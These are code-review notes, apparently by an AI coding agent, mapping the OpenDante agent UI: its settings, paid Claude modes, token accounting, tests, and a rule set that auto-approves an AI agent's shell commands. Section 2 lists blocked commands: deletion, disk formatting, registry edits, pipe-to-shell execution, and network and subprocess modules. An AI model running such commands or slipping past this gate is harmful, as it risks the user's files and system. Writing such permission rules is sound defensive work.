# Map B — OpenDante UI features (settings, permissions, Claude modes, pickers, tests)

Scope: `web/src/{SettingsPanel.tsx, Modi.tsx, settings.ts, requests.ts, RequestCard.tsx, FilePicker.tsx, FolderPicker.tsx, attachments.ts, skills.ts, chats.ts, projects.ts, companion.ts, claude.ts, usage.ts, UsageOverview.tsx, fs.ts}`, all `web/src/*.test.ts(x)`, `web/e2e/smoke.mjs`, `web/package.json`, `web/tsconfig.json`, `config/models.json`. For context I also read (not edited) `App.tsx`, `api.ts`, `stream.ts`, `ollama.ts`, `storage.ts`, `config/opencode.json`, and `companion/server.mjs` lines 28-110 and 300-486.

Method / evidence level
- Read every listed file completely.
- `npx vitest run` in `C:\openLLM\web`: **17 test files, 129 tests, all passed** (Vitest v5.0.4, jsdom, 8.9 s). (`98 Vitest (13 files)` in PROGRESS "Status" is stale.)
- Because the auto-allow findings are about behaviour, I **ran the real `autoDecision()` from `web/src/requests.ts`** on about 130 commands (Node 24 type-stripping, inline `node -` script, no file written). Everything labelled "verified" in section 6 comes from that run. Nothing was edited or started, no model loaded.
- "sicher" = verified by running code or unambiguous code reading. "Verdacht" = plausible from the code, but depends on behaviour I could not run (OpenCode internals, Windows, money paths).

---------------------------------------------------------------------------------------------------

## 1. Settings (`web/src/settings.ts`)

Store: zustand `useSettings` (`settings.ts:48`) with `persist`, localStorage key **`openllm.modes`** (`settings.ts:80`). No `partialize`, no `version`/`migrate`: the whole state (including `apiKey`) is written as plaintext JSON; new keys get their defaults through zustand's shallow merge (so `thinkMode` reaches old setups, comment `settings.ts:38-40`).

| key | type | default (file:line) | changed in UI | what it does | read by |
|---|---|---|---|---|---|
| `autopilot` | boolean | `false` (`settings.ts:51`) | Modi dialog row, switch `switch-autopilot` (`Modi.tsx:10-14`, `:60`) via `toggle` (`settings.ts:66`) | prepends `AUTOPILOT_PREFIX` (`settings.ts:85-86`) to the prompt so the local model follows skill `batch-autopilot`. No Claude, no cost | `App.tsx:54` (badge count), `App.tsx:347` |
| `offload` | boolean | `false` (`settings.ts:52`) | Modi row (`Modi.tsx:15-19`) | prepends `OFFLOAD_PREFIX` (`claude.ts:7-12`); after the turn sends `<<<CLAUDE …>>>` blocks to Claude (paid) | `App.tsx:54`, `:290`, `:348`, `:381`, `:522` |
| `audit` | boolean | `false` (`settings.ts:53`) | Modi row (`Modi.tsx:20-24`) | after every non-error, non-empty turn sends the answer text to Claude for review (paid) | `App.tsx:54`, `:290`, `:391`, `:522` |
| `autoAllow` | boolean | **`true`** (`settings.ts:54`) | Modi row, first (`Modi.tsx:5-9`) | answers permission requests by itself via `autoDecision` | `App.tsx:242` (effect), `App.tsx:537` → `RequestCard` prop (only changes the footer text, `RequestCard.tsx:50-54`) |
| `globalInstructions` | string | `''` (`:55`) | textarea `global-instructions` (`SettingsPanel.tsx:106-108`) | (a) prepended to every prompt; (b) written by the companion into a replaceable AGENTS.md block, **only** when "Speichern" or "Verbindung testen" in the *Claude* section is pressed | `App.tsx:349-350`; `SettingsPanel.tsx:161`, `:166` |
| `apiKey` | string | `''` (`:56`) | password input `api-key` (`SettingsPanel.tsx:145-146`) | Anthropic key; POSTed to companion `/settings` | `SettingsPanel.tsx:161`, `:166`; `App.tsx:523` (only decides which hint is shown) |
| `claudeModel` | string | `'claude-sonnet-5-5'` (`:57`) | select `claude-model` (`SettingsPanel.tsx:149`) | model for `/claude` calls and the key test | `SettingsPanel.tsx:161,166,167`; `App.tsx:385,394,526` |
| `localModel` | string | `DEFAULT_LOCAL_MODEL` = `config/models.json` `default` (`:58`) | select `local-model` (`SettingsPanel.tsx:113`) | Ollama tag the agent runs on; also preloaded/kept warm | `SettingsPanel.tsx:116`, `:252` (update-models body); `App.tsx:113,142-153,356,361,435,561,651`; `ChatSidebar.tsx:64-69` |
| `workdir` | string | `''` = server's own folder (`:59`) | "+" menu folder row / "Standard" (`App.tsx:461,602`), reopening a chat (`App.tsx:132`), `addFolders`/`removeFolder` (`settings.ts:68-78`), Einstellungen "Als Arbeitsordner" (`SettingsPanel.tsx:193`) and after clone (`:56`) | working folder, sent as `?directory=` on every OpenCode call; a change starts a fresh chat | `App.tsx:98-104,113,170,179,187,215-235,281,352-361,403-435`; `SettingsPanel.tsx:66,190,199,201`; `ChatSidebar.tsx:64-66` |
| `folders` | string[] | `[]` (`:60`) | FolderPicker → `addFolders` (`App.tsx:456-459`, `settings.ts:68-74`); ✕ → `removeFolder` (`App.tsx:595`) | saved folders for quick switching; `addFolders` also makes the first one active; removing the active one resets `workdir` to `''` (`settings.ts:75-78`) | `App.tsx:582-595` |
| `thinkingOpen` | boolean | `false` (`:61`) | sidebar toggle / "Gedankengang" link (`App.tsx:477,515,644`) | right-hand thinking sidebar open | `App.tsx:515,644` |
| `keepWarmMin` | number (0/30/60/120 offered) | `60` (`:62`) | select `keep-warm` (`SettingsPanel.tsx:119-125`) | keep-alive minutes for preload and after each answer; 0 = leave Ollama default (`ollama.ts:17,33`) | `App.tsx:143,147,275` |
| `planFirst` | boolean | `false` (`:63`) | checkbox `plan-first` (`App.tsx:624`) | next request goes to the read-only `plan` agent | `App.tsx:331` |
| `claudeDailyUsd` | number | `2` (`:64`) | number input `claude-cap` (`SettingsPanel.tsx:155-156`, `Math.max(0, Number(v) \|\| 0)`) | USD cap per UTC day for Claude modes, 0 = none; sent as `capUsd` | `App.tsx:385,394` → `claude.ts:29-33` |
| `thinkMode` | `'schnell' \| 'gruendlich'` | `'schnell'` (`:65`) | select `think-off` (`SettingsPanel.tsx:132-136`) | `schnell` = variant `ohne-denken` for build agent, plan agent always thinks; `gruendlich` = no variant | `App.tsx:354`; e2e steps c and g |

Store actions (not persisted data): `toggle(k: keyof Modes)` (`:42`/`:66`), `set(partial)` (`:43`/`:67`, typed for the 11 non-mode keys only), `addFolders` (`:44`/`:68-74`, trims, dedupes, activates first), `removeFolder` (`:45`/`:75-78`).

Module constants in `settings.ts`: `CLAUDE_MODELS` (`:14-18`, ids `claude-sonnet-5-5` / `claude-opus-5-5` / `claude-haiku-5-5`, prices in the note text: 2/10, 4/20, 0.10/0.50 USD per million tokens; same table in `companion/server.mjs:358`), `LOCAL_MODELS` (`:23`, from `config/models.json`), `DEFAULT_LOCAL_MODEL` (`:24`), `localModelName(id)` (`:25`), `AUTOPILOT_PREFIX` (`:85-86`).

`config/models.json`: `default` = `orcarouter/Qwen3.8-27B-Uncensored:q4_K_M`; 3 models (that one, `qwen3.8:27b`, `huihui_ai/Qwen3.8-abliterated:27b-q4_K_M`). `models.test.ts` forces `config/opencode.json` to list the same ids and default.

Prompt assembly order in `App.tsx:345-350`: `expandSkillCommand(prompt)` → `AUTOPILOT_PREFIX + …` → `OFFLOAD_PREFIX + …` → `${globalInstructions}\n\n…`. Final text order: global instructions, offload rule, autopilot rule, user prompt.

---------------------------------------------------------------------------------------------------

## 2. Permission auto-allow (`web/src/requests.ts`)

### 2.1 Building blocks
- `RISKY` (`:28-34`, one case-insensitive regex, 5 alternatives):
  1. `:29` `git [-C <x>] (push | reset --hard | clean | checkout -- | restore)`.
  2. `:30` word (after start/whitespace/`;&|(`, before whitespace/end) in: `rm del erase ri rd rmdir Remove-Item Clear-Content Clear-RecycleBin format Format-Volume mkfs diskpart shutdown Stop-Computer Restart-Computer takeown icacls`.
  3. `:31` `reg[.exe] delete|add`, `Set-ExecutionPolicy`.
  4. `:32` `iex`, `Invoke-Expression`, or `| sh|bash|pwsh|powershell`.
  5. `:33` `python[3]|py -c`, `node -e|-p|--eval|--print`, `powershell|pwsh[.exe] -c|-Command|-EncodedCommand|-enc` (flag must directly follow the program name), `cmd[.exe] /c`.
- Path check: `START` (`:40`) = `X:\`, `X:/`, `\\`, `~\`, `~/`; `PATH` (`:41`) takes quoted (may contain spaces) or unquoted tokens. `inside()` (`:37`) = lowercase, `/`→`\`, trailing `\` and `\*` stripped, equal or `startsWith(dir + '\')`. **No `..` resolution.** `PROGRAM` (`:44`) = ends in `.exe/.cmd/.bat/.com`; `PROGRAM_DIRS` (`:45`) = `c:\program files[ (x86)]\`, `c:\windows\`, `c:\python<n>\`, `\appdata\local\programs\`. A path that is such an installed program is not "outside" (its arguments still are checked). `pathsOutside(text, workdir, safe)` (`:49-52`).
- `openCodeSafeDirs(paths)` (`:57-63`): from `GET /path`: the `state` dir, the derived `…\share\opencode` data dir, and `<home>\AppData\Local\Temp\opencode`. Config dir deliberately excluded.
- Harmless one-liners: `ONE_LINER` (`:71`) whole part must be `python[3]|py -c` or `node -e|-p|--eval|--print`, then one quoted string that ends the part; `INTERPRETER` (`:72`); `ONE_LINER_DANGER` (`:73-87`) denylist inside the code string: `open(…, 'w'|'a'|'x'|'+')`/`mode=` writes, `.write_text/.write/.unlink/…`, `remove/unlink/rmdir/rename/makedirs/mkdir/chmod/system/popen/spawn*/exec[lv]*/kill/startfile/rmtree/move/copy*(`, `os.replace`/`Path(...).replace`, modules `shutil subprocess socket urllib requests http ftplib smtplib ctypes winreg webbrowser multiprocessing asyncio importlib pickle marshal child_process fs net https dgram worker_threads vm`, `__import__ exec eval compile globals setattr delattr Function(`, `require(`/`import(` of anything not `./` or `../`, `process.exit/kill/binding/dlopen`, `$(`, `${`, backtick. Also: code must be non-empty and must not contain the outer quote char (`oneLinerOk`, `:111-116`).
- `splitCommand` (`:92-109`): splits at `;`, `&&`, `||`, `\n`, `\r` outside single/double quotes (no backtick-escape handling), strips a PowerShell `if ($?) { … }` wrapper, returns `null` on unbalanced quotes. Single `|` and single `&` do not split.
- `harmlessOneLiner(cmd)` (`:120-124`): true only if at least one part starts with an interpreter `-c/-e` **and** every interpreter part passes `oneLinerOk` **and** every other part is not RISKY.
- `LOOP_HINT` (`:127-129`): German text sent as the `message` of an automatic reject.

### 2.2 `autoDecision(p, workdir, safe)` — decision order (`:133-145`)
1. `doom_loop` → `{reply:'reject', message: LOOP_HINT}` (`:134`).
2. `text = command + ' ' + patterns.join(' ')` (`:135`).
3. `external_directory` (`:136-140`): `once` only if there is at least one target (patterns, `metadata.filepath`, `metadata.directory`) and **every** target is inside a safe dir; else `null`.
4. `bash` and `harmlessOneLiner(command)` and no path outside → `once` (`:141`). This path skips `RISKY`.
5. `RISKY.test(text)` (any permission type) → `null` (`:142`).
6. `bash` and `pathsOutside(text, …).length > 0` → `null` (`:143`).
7. Everything else → `once` (`:144`): all remaining bash commands and **all other permission types** (`edit`, `webfetch`, `websearch`, `task`, `skill`, `read`, unknown).
`null` = leave to the user. `App.tsx:241-250` runs it for every pending request once (guard `autoReplied`), with `workdir = modes.workdir || serverDir`. `whyAsked` (`:148-154`) builds the reason shown on the card: external_directory text, else the RISKY text, else the outside-folder text, else `''`.

### 2.3 Six concrete examples (all verified by running `autoDecision`, workdir `C:\Users\Shadow\code\demo`)
| command | decision | why |
|---|---|---|
| `npm test` | `once` | not risky, no absolute path → step 7 |
| `git push origin main` | `null` (ask) | RISKY alt 1 (`:29`) |
| `Remove-Item -Recurse build` | `null` | RISKY alt 2 (`:30`) |
| `python -c "print(1+1)"` | `once` | harmless one-liner (step 4) |
| `python -c "import shutil; shutil.rmtree('x')"` | `null` | `shutil` in `ONE_LINER_DANGER`, and RISKY alt 5 |
| `Set-Content C:\Windows\x.txt 1` | `null` | `pathsOutside` (step 6) |

More: `& "C:\Program Files\Python312\python.exe" test.py` → `once` (installed program exempt); `external_directory …\share\opencode\plans\*` with safe dirs → `once`; `external_directory C:\data\*` → `null`; `doom_loop` → `reject` + hint; `cd src; python -c "import bestellung; print(bestellung.summe(1,2))"` → `once`.

Defence in depth: OpenCode itself already allows/denies by `permission.bash` in `config/opencode.json` (allow list, `python -c*` etc. `ask`, `rm*/Remove-Item*/…` `deny`); the UI only sees what OpenCode marks `ask`. See findings F1-F12 for commands that wrongly end up `once`.

---------------------------------------------------------------------------------------------------

## 3. Claude modes (`claude.ts`, `usage.ts`, `Modi.tsx`, App wiring)

All three modes are switches in `Modi.tsx` (order in dialog: autoAllow, autopilot, offload, audit). Offload/Audit need the key; without one the companion answers `Kein Claude-Schlüssel gespeichert …` (`server.mjs:387`) and the chat shows an error bubble.

### Autopilot
- Sends: nothing to Claude. `AUTOPILOT_PREFIX` ("Arbeite nach dem Skill "batch-autopilot": in kleinen Etappen, mit FORTSCHRITT.md …", `settings.ts:85-86`) is prepended to the prompt that goes to OpenCode `POST /session/{id}/prompt_async` (`api.ts:40-44`, called `App.tsx:356/361`). Cost: none. Depends on skill `skills/batch-autopilot` being installed.

### Offload ("Mit Claude beschleunigen")
- Local side: `OFFLOAD_PREFIX` (`claude.ts:7-12`) prepended to the prompt (`App.tsx:348`). It asks the local model to wrap a self-contained harmless subtask in `<<<CLAUDE` … `>>>` on their own lines.
- After the turn (`App.tsx:290` → `postProcessClaude`, `:379-399`): `offloadTasks(splitThinking(t.text).answer || t.text)` (regex `/<<<CLAUDE([\s\S]*?)>>>/g`, trimmed, empty blocks dropped; `claude.ts:50-56`). For each block, sequentially: placeholder bubble "↗ Claude bearbeitet eine Teilaufgabe …" (pending) → `claudeOffload(task, claudeModel, claudeDailyUsd)` (`claude.ts:32-33`) = `POST {COMPANION}/claude {system: OFFLOAD_SYSTEM, prompt: task, model, capUsd}` → companion `POST https://api.anthropic.com/v1/messages` (`max_tokens: 4096`, `server.mjs:394-398`) → bubble "↗ Teilergebnis von Claude (<model>):\n\n<text>" (kind `claude`). On error the bubble says "↗ Claude-Auslagerung ging nicht: <message>".
- Display: `hideOffloadMarkers` (`claude.ts:44-47`) replaces closed or still-streaming blocks in the answer with "↗ Teilaufgabe an Claude übergeben (Ergebnis folgt unten)." (used in `Bubble.tsx:13`); the task text is shown in the thinking sidebar (`messages.ts` `toThought`).
- The Claude result is **not** sent back into the OpenCode session (see F20).

### Audit ("Claude-Audit")
- No local prefix. After a turn without error and with non-empty text: `claudeAudit(answerText, claudeModel, claudeDailyUsd)` (`claude.ts:29-30`) = `POST /claude {system: AUDIT_SYSTEM, prompt: <answer text>, model, capUsd}`. `AUDIT_SYSTEM` (`claude.ts:14-19`): strict senior reviewer; checks runnability, concrete bugs, typical small-model weaknesses; German numbered points with severity; ends with a one-sentence verdict. Result bubble "🔍 Claude-Audit (<model>):\n\n…"; failure bubble "🔍 Claude-Audit ging nicht: …".
- What is sent is only `t.text` (assistant prose parts, `stream.ts:28-31`): not the user prompt, not tool arguments or files written (see F17).

### Cost cap handling
- UI: `claudeDailyUsd` (default 2, `settings.ts:64`) passed per call as `capUsd`. Input `Math.max(0, Number(v) || 0)`, 0 = no cap (`SettingsPanel.tsx:156,157`).
- Companion (`server.mjs:385-405`): if `cap > 0` and `todayUsd >= cap` → throws `Tageslimit für Claude erreicht (x $ von y $) …` **before** the API call (so one call can overshoot). After the call: `cost = (in*priceIn + out*priceOut)/1e6` with `CLAUDE_PRICES` (`:358`: opus [4,20], sonnet [2,10], haiku [0.1,0.5]; unknown model priced as opus), added to `~/.opendante/claude-usage.json` (`{date (UTC), usd, calls}`, `:360-381`, resets at UTC midnight). Reply carries `costUsd`, `todayUsd`, but the UI ignores both (`claude.ts:26` declares them; no reader).
- UI shows today's spend only inside Einstellungen: `GET /claude/usage` on open (`SettingsPanel.tsx:38`) → "· heute verbraucht: x.xx $" (`:158`). `/claude/test` (ping, `max_tokens: 1`) is not counted and not capped.
- `companion/test.mjs:47-52` pins the cap error, the usage report and the day reset (not in my scope, but it is the only test of the cap).

### Token accounting formulas (`usage.ts`, `stream.ts`, `claude.ts`)
- Per local assistant message (`stream.ts:104-107`): `input = tokens.input + tokens.cache.read + tokens.cache.write`, `output = tokens.output + tokens.reasoning`; the **latest** value per message id is kept; turn totals are the sum over messages.
- `turnTokens(t)` (`usage.ts:26-30`): `t.usage.output` if > 0 (exact), else `max(1, round((len(text)+len(reasoning))/4))` flagged `estimated`; 0 if no characters.
- `addLocal(u, t)` (`:33-37`): if tokens = 0 → unchanged (input also dropped); else `local += tokens`, `localIn += t.usage?.input ?? 0`, `localEstimated ||= estimated`. Called when a real (non-simulated) turn is committed (`App.tsx:270`) and, for the live display, on the running turn (`App.tsx:476`).
- `addClaude(u, kind, usage)` (`:40-51`): `claudeIn += input_tokens`, `claudeOut += output_tokens`, `offloadOut`/`auditOut` by kind, `offloads += 1` for offload. Missing usage counts 0.
- `usageSplit(u)` (`:74-77`): `null` if `local + claudeOut = 0`; else `taskSplit(local, claudeOut)` (`claude.ts:36-40`): `localPct = round(local/(local+claudeOut)*100)`, `claudePct = 100 - localPct` (`taskSplit(0,0)` returns `{0,100}`; guarded by the null above).
- `savedTokens(u) = localIn + local` (`:71`) = "Gespart durch lokal" (assumes Claude would need the same amount).
- `totalUsage(list)` (`:54-67`) sums chat metas (missing fields 0). Shown in `UsageOverview.tsx` (tiles: Claude %, saved; table read/generated; footer with `offloadOut`/`auditOut`; "≈" prefix when `localEstimated`). Per-chat live counter is `UsageReadout.tsx` (not in my scope).
- `fmtExact(n)` = `Math.round(n).toLocaleString('de-DE')`.

---------------------------------------------------------------------------------------------------

## 4. Per file

### settings.ts (86 lines)
Purpose: persisted settings store, model lists, autopilot prefix. Exports: `Modes`, `CLAUDE_MODELS`, `LOCAL_MODELS`, `DEFAULT_LOCAL_MODEL`, `localModelName`, `useSettings`, `AUTOPILOT_PREFIX`. Magic numbers: `keepWarmMin 60` (`:62`), `claudeDailyUsd 2` (`:64`). Endpoints: none. localStorage: `openllm.modes` (`:80`). See section 1.

### Modi.tsx (66 lines)
Purpose: "Modi" dialog with 4 switches. Exports: `Modi({open,onClose})` (dialog, `data-testid="modi"`, Escape closes via `useEscape`). Internal: `ROWS` (`:4-25`, keys autoAllow/autopilot/offload/audit with German titles and descriptions), `Switch` (`:58-66`, `role="switch"`, testid `switch-<key>`; knob travels 20 px). Constants: none numeric. Endpoints/localStorage: none (writes the store).

### SettingsPanel.tsx (272 lines)
Purpose: "Einstellungen" dialog (`data-testid="settings"`): Übersicht, Globale Anweisungen, Lokales Modell (+ keep-warm, think mode), Claude-Verbindung (key, model, cap, Speichern, Verbindung testen), Projekte (GitHub), Connectoren (disabled placeholder), Skills, Updates.
Exports: `skillNameFrom(content, fileName)` (`:11-15`, regex on the `name:` line after `---`, else file name without `.md/.markdown`), `Settings({open,onClose})` (`:20`). Internal: `run(label, fn)` (`:44-47`), `doClone` (`:50-60`), `doGit` (`:63-71`), `onPickFile` (`:74-92`, multi-file SKILL.md upload, each `POST /skills {name, content}`), `Section` (`:263-271`).
Magic numbers: keep-warm options 0/30/60/120 (`:121-124`), cap `min=0 step=0.5` (`:155`), modal `max-w-[620px] max-h-[92vh]` (`:96`).
Endpoints (COMPANION, 127.0.0.1:4097): `GET /claude/usage` (`:38`, no timeout); `POST /settings {globalInstructions, apiKey, claudeModel}` (`:161`, `:166`); `POST /claude/test {model}` (`:167`); `POST /skills {name, content}` (`:84`, `:245`); `POST /update/app` (`:251`); `POST /update/models {model}` (`:252`). Indirect through stores on open (`:37`): `GET /skills`, `GET /repos`, `GET /chats`; through `projects.ts`: `POST /repo/clone`, `POST /git`.
localStorage: none directly (the store). Test ids: `global-instructions, local-model, keep-warm, think-off, api-key, claude-model, claude-cap, claude-spent, save-claude, test-claude, repo-url, clone-repo, repo-list, commit-msg, git-commit, git-push, git-status, git-pull, skill-file, upload-skill, skill-list, save-skill, update-app, update-models`.

### requests.ts (154 lines)
Purpose: describe permission requests in German and decide the automatic answer; also imported by `scripts/eval.mjs:21` (the Testlauf judges its commands with the same function). Exports: `describePermission` (`:8-21`, title+detail for bash/edit/external_directory/doom_loop/webfetch/websearch/task/default), `pathsOutside` (`:49`), `openCodeSafeDirs` (`:57`), `splitCommand` (`:92`), `harmlessOneLiner` (`:120`), `LOOP_HINT` (`:127`), `autoDecision` (`:133`), `whyAsked` (`:148`). Regexes and decision order: section 2. Endpoints/localStorage: none.

### RequestCard.tsx (110 lines)
Purpose: card above the input for the oldest open request. Exports: `RequestCard` (`:8`; a question wins over a permission; shows "+n weitere"). `PermissionBox` (`:25-58`): loop cards offer "Anders weitermachen" (`reject`, no message, testid `perm-redirect`) and "Trotzdem einmal"; others "Einmal erlauben" (`once`), "Immer erlauben" (`always`), "Ablehnen" (`reject`); footer text depends on `autoAllow` and `whyAsked`. `QuestionBox` (`:60-110`): single/multi choice per question, optional free text, "Antworten" disabled until every question has an answer, "Überspringen (selbst entscheiden)" rejects. Constants: detail box `max-h-28`. Endpoints: none (callbacks to `App.tsx` which calls `POST /permission/{id}/reply`, `/question/{id}/reply|reject`). localStorage: none.

### FilePicker.tsx (94 lines)
Purpose: in-app multi-file browser for "Datei anhängen". Exports: `FilePicker({open,onClose,onPick})`. `MAX_LISTED = 500` (`:6`, mirrors the companion limit). Ticks survive folder navigation; reopen resets to roots and clears ticks (`:26`); `latest` ref (`:15`) drops stale listings; files over `LARGE_FILE_BYTES` show "groß – kostet viel Kontext"; sizes via `fmtKB`. Endpoint (via `fs.ts`): `GET /fs?path=…&files=1`. Test ids `file-picker, fp-here, fp-up, fp-roots, fp-list, fp-open, fp-file, fp-check, fp-file-name, fp-large, fp-size, fp-count, fp-confirm, fp-close`.

### FolderPicker.tsx (76 lines)
Purpose: in-app multi-folder browser (replaces the native dialog). Exports: `FolderPicker`, re-export `baseName` (`:76`, used by `App.tsx`). "Diesen Ordner" appears when the current path is non-empty (`canPickHere`, `:24`, includes drive roots). No stale-response guard (`:13-16`). Endpoint: `GET /fs?path=…` (no `files`). Shares test ids `fp-*` with FilePicker.

### attachments.ts (59 lines)
Purpose: file attachments to OpenCode file parts. Exports: `Attachment`, `FilePart`, `LARGE_FILE_BYTES = 1024*1024` (`:11`), `IMAGE_HINT` (`:12`), `mimeFor` (`:19`, png/jpg/jpeg/gif/webp → image/*, pdf → application/pdf, all else `text/plain`), `isImageName`, `fileUrl` (`:30-38`, `C:\a b#.txt` → `file:///C:/a%20b%23.txt`, UNC → `file://server/…`, POSIX → `file:///…`, `#` and `?` encoded), `filePart` (`:41`), `fmtKB` (`:44`, whole KB, min 1, `de-DE`), `mergeAttachments` (`:50`, dedupe by path), `withAttachmentLines` (`:58`, appends `📎 name` lines). Endpoints: none itself; the parts go out in `api.ts:41-44` `POST /session/{id}/prompt_async`.

### skills.ts (45 lines)
Purpose: installed skills list + `/slug` expansion. Exports: `SkillInfo`, `useSkills` (`:14-30`; `refresh()` `GET /skills` with `AbortSignal.timeout(2000)` (`:19`), rejects non-array bodies (old companion returns SPA HTML), on failure sets `loaded:true` and keeps the old list), `expandSkillCommand(text, list)` (`:37-45`, regex `^\/([a-z0-9-]+)\b[ \t]*([\s\S]*)$` case-insensitive; known slug → "Verwende den Skill „<name>" und arbeite genau nach seiner Anleitung." + rest; unknown → unchanged).

### chats.ts (94 lines)
Purpose: history (Verlauf) store. Exports: `ChatMeta`, `SavedChat`, `newChatId` (`:31`, `chat-<base36 time>-<6 random>`), `chatTitle` (`:34`, one line, ≤60 chars with `…`, empty → "Neuer Chat"), `relDate` (`:40`, "gerade eben", "vor n Min.", "HH:MM" today, "gestern", "d.m." / "d.m.yyyy"), `useChats` (`:61-94`: `refresh` `GET /chats` (`:66`), `save` `POST /chats` (`:74`, prepends returned meta), `load` `GET /chats/{id}` (`:78`), `rename` optimistic then `POST /chats/rename` (`:87`), `remove` optimistic then `POST /chats/delete` (`:92`, errors swallowed)). Magic numbers: 60/59 (`:36`), 86400000 (`:46`).

### projects.ts (37 lines)
Purpose: cloned GitHub projects + git helpers. Exports: `RepoInfo`, `useProjects` (`GET /repos`, timeout 3000 ms (`:19`), same array guard), `CloneResult`, `cloneRepo(url)` (`POST /repo/clone {url}`, `:33`), `GitResult`, `gitAction(path, action: status|commit|push|pull, message?)` (`POST /git`, `:36-37`).

### companion.ts (24 lines)
Purpose: base URL + POST helper for the companion. Exports: `COMPANION` (`:6`, `localStorage['openllm.companion']` or `http://127.0.0.1:4097` (`:5`)), `companionHealth` (`:8-10`, `GET /health`, timeout 1500 ms; **unused**), `companionPost<T>(path, body?)` (`:13-22`, always JSON, throws `Error(j.error)` or the status code), `OFFLINE_HINT` (`:24`). localStorage: `openllm.companion`.

### claude.ts (56 lines)
Purpose: prompts and calls of the two paid modes. Exports: `OFFLOAD_PREFIX` (`:7`), `ClaudeReply` (`:26`), `claudeAudit` (`:29`), `claudeOffload` (`:32`), `taskSplit` (`:36`), `hideOffloadMarkers` (`:44`), `offloadTasks` (`:50`). Internal: `AUDIT_SYSTEM` (`:14`), `OFFLOAD_SYSTEM` (`:21-24`: solve the self-contained task completely, only the finished solution, say so in one sentence if not solvable without context). Endpoint: `POST /claude` (via `companionPost`, `:30`, `:33`).

### usage.ts (80 lines)
Purpose: pure token bookkeeping. Exports: `ChatUsage` (`:11-20`), `emptyUsage`, `turnTokens`, `addLocal`, `addClaude`, `totalUsage`, `savedTokens`, `usageSplit`, `fmtExact`. Constant: 4 characters per token (`:29`). No endpoints.

### UsageOverview.tsx (73 lines)
Purpose: Einstellungen → Übersicht. Exports: `UsageOverview({chats, loaded})`. Not loaded → "Lädt…"; no tokens → `overview-empty`; else tiles `overview-claude-pct`, `overview-saved`, the split bar, a read/generated table and an explanation. Test ids `overview, overview-empty, overview-claude-pct, overview-saved`. No endpoints (data from `useChats().list`).

### fs.ts (20 lines)
Purpose: browse the PC's folders via the companion. Exports: `FsEntry`, `FsFile`, `FsListing`, `listDir(path?, withFiles=false)` (`GET /fs?path=<enc>&files=1`, `:12-13`; throws `j.error` or "Der lokale Dienst läuft nicht …" when the body has no `dirs`), `baseName` (`:20`).

### package.json / tsconfig.json / models.json
- `package.json`: name `openllm-web`; scripts `dev` (vite), `build` (`tsc --noEmit && vite build`), `preview` (port 4175), `test` (`vitest run`), `e2e` (`node e2e/smoke.mjs`). deps react ^19.3.0, react-dom ^19.3.0, zustand ^5.0.15; devDeps @tailwindcss/vite/tailwindcss ^4.3.3, @vitejs/plugin-react ^6.1.2, jsdom ^29.1.1, playwright ^1.64.1, typescript ^7.0.2, vite ^8.3.4, vitest ^5.0.4, @types/react(-dom) ^19.3.0. (`vite.config.ts` sets `test.environment: 'jsdom'`.) Installed Vitest reported v5.0.4. I did not verify the other versions against a registry.
- `tsconfig.json`: ES2022, bundler resolution, `strict`, `noUnusedLocals`, `noUnusedParameters`, `noFallthroughCasesInSwitch`, `resolveJsonModule`, `jsx: react-jsx`, `include: ["src"]` (so test files are type-checked by `npm run build`). Unused *exports* are not flagged, which is why dead exports survive.
- `config/models.json`: see section 1.

---------------------------------------------------------------------------------------------------

## 5. Tests

### 5.1 Vitest (17 files, 129 tests, all green)
| file (it count) | pins down |
|---|---|
| `requests.test.ts` (13) | `describePermission` German titles; `autoDecision` allows ordinary in-folder work, turns doom_loop into reject+`LOOP_HINT`, asks for push/reset/clean/delete incl. aliases and `reg delete`, asks for download-and-run and interpreter one-liners, asks for outside paths (`external_directory`, `C:\Windows`, `~\.ssh`); OpenCode safe dirs (plan, `%TEMP%\opencode`, never config dir); 11 real harmless one-liners/chains allowed and 25 dangerous ones asked; `pathsOutside` case/slash-insensitive, `demo-old` sibling counts as outside, installed-program exemption |
| `attachments.test.ts` (15) | `mimeFor`, `isImageName`, `fileUrl` (drive colon, spaces, `#`, `%`, `?`, non-ASCII, UNC, POSIX, URL round-trip), `filePart` shape, `fmtKB`, `mergeAttachments`, `withAttachmentLines`, and that `sendPrompt` sends text part + one file part per attachment |
| `usage.test.ts` (10) | per-message usage (latest per message, sum of steps, cache read counted as input), `turnTokens` exact/estimated/zero, `addLocal`/`addClaude` accumulation and split 80/20, `totalUsage` with old saves, estimate flag, `fmtExact` |
| `claude.test.ts` (10) | `hideOffloadMarkers` (closed, streaming, none), `taskSplit` (70/30, all-local, no divide by zero), `offloadTasks` (single, several, none, empty) |
| `chats.test.ts` (3) | `newChatId` format, `chatTitle` rules, `relDate` outputs |
| `skills.test.ts` (5) | `expandSkillCommand` (bare, with rest, unknown, plain text, case) |
| `skillname.test.ts` (4) | `skillNameFrom` (head name, quoted, fallback to file name x2) |
| `FilePicker.test.tsx` (6) | renders nothing closed; starts at roots with `files=1`; navigates; KB sizes and ">1 MB" flag; multi-folder tick + "Anhängen (n)" + close; ✕ and Escape; reopen resets |
| `fs.test.ts` (2) | `baseName`; `addFolders`/`removeFolder` (dedupe, activate first, removing active resets) |
| `models.test.ts` (4) | `config/models.json` is the app's list; default is in the list; `opencode.json` has identical ids/default; no `_comment` keys inside blocks |
| `ollama.test.ts` (4) | `loadPct` (50 %, min 1, max 99, 30 s fallback) |
| `stream.test.ts` (14) | event reducer: text/reasoning split by part type, tools, usage, user message ids (undo, plan→build), retry status, errors, idle |
| `splitthinking.test.ts` (4) | `<think>` splitting incl. streaming |
| `progress.test.ts` (17) | step detection from the measured event order, `estimateStep`, `quantile`, `estimateTask`, `smoothEnd` |
| `eta.test.ts` (10) | `clock`, `median`, and the old estimator functions (`elapsed*`, `tokensPerSec`, `estimateTotalMs`, `remaining*`, `fraction`) — **8 of 10 tests pin code no production file uses** |
| `loops.test.ts` (5) | `detectLoop` (quiet, 3× failing, oscillation, 4× in a row, running calls ignored) |
| `diffs.test.ts` (3) | `cleanPatch` ignores CRLF-only changes, keeps real changes, empty patch |

### 5.2 E2E smoke (`web/e2e/smoke.mjs`, `npm run e2e`, not part of `npm test`)
Starts the Vite dev server on a free port (`:50-88`), opens it in the installed **system Chrome** (`channel: 'chrome'`, `:358`), viewport 1280x800, service workers blocked. Hard limit 75 s (`:29`).
